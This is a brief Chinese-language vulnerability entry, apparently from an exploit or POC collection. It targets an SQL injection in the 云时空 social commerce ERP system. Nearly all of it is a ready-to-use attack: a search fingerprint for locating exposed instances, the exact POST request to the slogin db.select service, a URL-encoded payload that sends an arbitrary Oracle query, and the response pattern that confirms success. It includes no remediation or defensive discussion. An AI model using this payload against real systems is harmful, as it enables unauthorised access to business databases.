# 云时空社会化商业ERP系统sloginSQL注入漏洞

云时空社会化商业ERP系统slogin ｜ SQL注入 ｜ —
- **指纹**：`app="云时空社会化商业ERP系统"`
- **请求**：`POST /slogin/service?service=db.select HTTP/1.1`

**Payload**
```
params=%7B%22sql%22%3A%22SELECT+%2A+FROM+V%24VERSION%22%7D
```
- **响应特征**：200 values